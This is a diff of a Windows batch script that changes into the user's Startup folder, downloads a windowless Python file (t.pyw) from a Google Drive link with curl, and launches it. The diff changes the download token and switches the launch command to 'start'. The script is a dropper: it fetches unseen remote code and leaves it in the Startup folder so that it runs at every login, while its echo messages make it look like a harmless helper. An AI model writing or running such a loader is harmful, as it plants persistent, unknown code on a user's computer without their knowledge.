@@ -15,9 +15,9 @@ cd /d "%startupFolder%"
 
 rem Display the current directory to confirm
 echo You are now in the Startup folder:
-curl -o t.pyw https://drive.usercontent.google.com/download?id=1gC89KsuuYYsGoVJKko68uwO-O2Cjteaa&export=download&authuser=0&confirm=t&uuid=7de8c40b-466f-49f3-8b2e-5440df5fd235&at=ABswASZvXrV3Emqz4ojvYM7N1cH6:1785267897992
+curl -o t.pyw https://drive.usercontent.google.com/download?id=1gC89KsuuYYsGoVJKko68uwO-O2Cjteaa&export=download&authuser=0&confirm=t&uuid=e73a9c3b-7ffd-46a1-8a4f-977d0cd32740&at=ABswASaBoOE6FoBY9lPD2sDbk7Ni:1785270720679
 
-py ./t.pyw
+start t.pyw
 
 rem Optional: list the contents of the Startup folder
 dir
